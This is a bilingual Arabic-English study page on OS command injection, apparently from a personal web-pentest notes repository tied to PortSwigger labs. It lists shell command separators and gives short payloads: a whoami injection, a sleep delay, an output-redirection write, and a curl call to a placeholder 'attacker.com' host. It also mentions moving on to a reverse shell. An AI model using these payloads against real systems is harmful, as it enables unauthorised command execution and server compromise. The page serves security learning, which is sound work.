# Command Injection (OS Command Injection) | حقن الأوامر

> **OWASP Category:** [A03 - Injection](../README.md)  
> **Methodology:** [Step-?? - Command Injection Testing](../../../web-pentest-methodology/Phase-3-Vulnerability-Testing/Step-??-Command-Injection-Testing.md)  
> **PortSwigger Labs:** [Solutions](../../../portswigger-labs/Server-Side/Command-Injection/)

---

## ما هي؟ | What is it?

تحدث هذه الثغرة عندما يقوم التطبيق بتمرير مدخلات المستخدم مباشرة إلى "صدفة نظام التشغيل" (Shell) لتنفيذ أمر معين (مثل إرسال بريد، تحويل ملف، أو فحص شبكة). إذا لم يتم فحص هذه المدخلات، يمكن للمهاجم استخدام رموز الفصل (مثل `;` أو `&&`) لدمج أوامره الخاصة مع الأمر الأصلي.

---

## كيف تستغلها؟ (خطوات مفصلة) | How to Exploit?

### 1. مرحلة الرصد | Enumeration

- ابحث عن وظائف تتفاعل مع النظام، مثل:
    - أداة فحص الاتصال (Ping tools)
    - محولات الصيغ (Image/PDF Converters)
    - أدوات إرسال البريد التي تستخدم sendmail
- راقب البارامترات التي ترسل أسماء ملفات أو عناوين IP.

### 2. التحليل عبر Burp Suite | Analysis via Burp Suite

- اعترض الطلب وأرسله إلى Repeater.
- حاول دمج أمر بسيط مثل `whoami` أو `id` باستخدام مشغلات الأوامر (Command Separators):

| النظام | المشغلات |
|--------|---------|
| **Linux** | `;` , `&&` , `\|` , `\|\|` , `` ` `` (Backticks) , `$(...)` |
| **Windows** | `&` , `&&` , `\|` , `\|\|` |

### 3. محاور الهجوم | Attack Vectors

#### In-band (Simple) | حقن مباشر
إذا كان السيرفر يعرض نتيجة الأمر مباشرة في الصفحة:
```
127.0.0.1 ; whoami
```

#### Blind (OAST) | حقن أعمى
إذا كان السيرفر ينفذ الأمر ولكن لا يظهر النتيجة:

- **Time Delays:** أجبر السيرفر على التأخر في الرد:
```
127.0.0.1 ; sleep 10
```

- **Out-of-band:** أجبر السيرفر على مراسلتك خارجياً:
```
127.0.0.1 ; curl http://attacker.com
```

- **Output Redirection:** كتابة النتيجة في ملف ثابت:
```
127.0.0.1 ; whoami > /var/www/static/result.txt
```

### 4. تأكيد الاستغلال | Impact Verification

- بمجرد التأكد من تنفيذ `whoami` بنجاح، الهدف التالي هو الحصول على Reverse Shell للسيطرة الكاملة = تم الاستغلال بنجاح (Full System Compromise).

---

## 🔍 كيفية اكتشافها في منهجيتي | How to Find in My Methodology

> 📂 **راجع ملف المنهجية التفصيلي:**  
> [Web-Pentest-Methodology - Phase 3 - Command Injection Testing](../../../web-pentest-methodology/Phase-3-Vulnerability-Testing/Step-??-Command-Injection-Testing.md)

---

## 🧪 مختبرات PortSwigger | PortSwigger Labs

| المختبر | الصعوبة | الحل |
|---------|--------|------|
| OS command injection, simple case | Apprentice | [الحل](../../../portswigger-labs/Server-Side/Command-Injection/01-simple-case.md) |
| Blind OS command injection with time delays | Practitioner | [الحل](../../../portswigger-labs/Server-Side/Command-Injection/02-blind-time-delays.md) |
| Blind OS command injection with output redirection | Practitioner | [الحل](../../../portswigger-labs/Server-Side/Command-Injection/03-blind-output-redirection.md) |
| OS command injection with out-of-band interaction | Practitioner | [الحل](../../../portswigger-labs/Server-Side/Command-Injection/04-blind-oast.md) |
| Blind OS command injection with out-of-band exfiltration | Practitioner | [الحل](../../../portswigger-labs/Server-Side/Command-Injection/05-blind-oast-exfiltration.md) |
